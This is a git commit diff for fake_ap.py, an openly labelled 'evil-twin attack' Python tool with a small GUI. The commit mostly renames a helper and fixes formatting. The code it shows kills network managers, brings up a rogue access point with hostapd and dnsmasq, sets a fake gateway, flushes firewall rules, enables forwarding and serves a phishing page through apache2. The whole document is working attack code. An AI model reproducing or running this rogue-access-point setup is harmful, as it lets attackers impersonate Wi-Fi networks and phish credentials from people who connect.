c8678f5e324b8c2575d090a5a2702fe21923c639
Roiabr <roiabr15@gmail.com>
2020-09-30 11:50:44 +0300

    add function

--- fake_ap.py
+++ fake_ap.py
@@ -11,7 +11,7 @@ sniffer_interface = sys.argv[1]
 network_name = sys.argv[2]
 
 
-def outlinepritner(str):
+def gui_line_printer(str):
     global window
     os.system(str)
     time.sleep(0.2)
@@ -32,15 +32,15 @@ def reset_network():
         print("removing hostapd.conf failed")
 
         # cleaning
-    outlinepritner('service NetworkManager start')
-    outlinepritner('service hostapd stop')
-    outlinepritner('service apache2 stop')
-    outlinepritner('service dnsmasq stop')
-    outlinepritner('service rpcbind stop')
-    outlinepritner('killall dnsmasq')
-    outlinepritner('killall hostapd')
-    outlinepritner('systemctl enable systemd-resolved.service')
-    outlinepritner('systemctl start systemd-resolved')
+    gui_line_printer('service NetworkManager start')
+    gui_line_printer('service hostapd stop')
+    gui_line_printer('service apache2 stop')
+    gui_line_printer('service dnsmasq stop')
+    gui_line_printer('service rpcbind stop')
+    gui_line_printer('killall dnsmasq')
+    gui_line_printer('killall hostapd')
+    gui_line_printer('systemctl enable systemd-resolved.service')
+    gui_line_printer('systemctl start systemd-resolved')
 
 
 def main():
@@ -49,7 +49,6 @@ def main():
     global window
     sniffer_interface = sys.argv[1]
     network_name = sys.argv[2]
-
 
     layout = [[sg.Text('Choose name for create Fake ap ')],
               [sg.Input(key='Fake_name')],
@@ -61,14 +60,14 @@ def main():
     while True:
         event, values = window.read()
         if event == 'select name':
-            if values['Fake_name'] =="":
-                network_name=values['Fake_name']
+            if values['Fake_name'] == "":
+                network_name = values['Fake_name']
             window.close
             layout = [[sg.Text('Choose name for fake ap  ')],
-                  [sg.Text('command run')],
-                  [sg.Text('', key='_printer_', size=(60, 1), justification='center', text_color='blue',
-                           background_color='white')],
-                  [sg.Button('Cancel')]]
+                      [sg.Text('command run')],
+                      [sg.Text('', key='_printer_', size=(60, 1), justification='center', text_color='blue',
+                               background_color='white')],
+                      [sg.Button('Cancel')]]
 
             window = sg.Window('evil-twin attack', layout
                                , finalize=True)
@@ -81,53 +80,51 @@ def main():
             reset_network()
             break
 
+
 def commands_before_attack():
     global sniffer_interface
     global network_name
     global window
 
-    outlinepritner('systemctl disable systemd-resolved.service')
-    outlinepritner('systemctl stop systemd-resolved')
+    gui_line_printer('systemctl disable systemd-resolved.service')
+    gui_line_printer('systemctl stop systemd-resolved')
 
-    outlinepritner('service NetworkManager stop')
+    gui_line_printer('service NetworkManager stop')
 
     # AP with address 10.0.0.1 with free 8 bits
     ifconfig = "ifconfig " + sniffer_interface + " 10.0.0.1 netmask 255.255.255.0"
 
-    outlinepritner('airmon-ng check kill')
-    outlinepritner(ifconfig)
+    gui_line_printer('airmon-ng check kill')
+    gui_line_printer(ifconfig)
 
     # create fake gw
-    outlinepritner('route add default gw 10.0.0.1')
+    gui_line_printer('route add default gw 10.0.0.1')
 
     # enable ip forwarding
-    outlinepritner('echo 1 > /proc/sys/net/ipv4/ip_forward')
+    gui_line_printer('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
     # clear firewall ruled which might block some request
-    outlinepritner('iptables --flush')
-    outlinepritner('iptables --table nat --flush')
-    outlinepritner('iptables --delete-chain')
-    outlinepritner('iptables --table nat --delete-chain')
+    gui_line_printer('iptables --flush')
+    gui_line_printer('iptables --table nat --flush')
+    gui_line_printer('iptables --delete-chain')
+    gui_line_printer('iptables --table nat --delete-chain')
 
     # enable forwarding
-    outlinepritner('iptables -P FORWARD ACCEPT')  #
+    gui_line_printer('iptables -P FORWARD ACCEPT')  #
 
     line = "python3 Conf_File_Server.py " + sniffer_interface + " " + network_name
-    outlinepritner(line)
+    gui_line_printer(line)
 
     # start the AP
-    outlinepritner('dnsmasq -C dnsmasq.conf')
-    outlinepritner('hostapd hostapd.conf -B')
+    gui_line_printer('dnsmasq -C dnsmasq.conf')
+    gui_line_printer('hostapd hostapd.conf -B')
 
     # start the server for to broadcast our default page
-    outlinepritner('service apache2 start')
-    outlinepritner('route add default gw 10.0.0.1')  # create fake gw
+    gui_line_printer('service apache2 start')
+    gui_line_printer('route add default gw 10.0.0.1')  # create fake gw
     time.sleep(1)
     print('---> Phishing page loaded \n')
 
 
 if __name__ == '__main__':
     main()
-
-
-
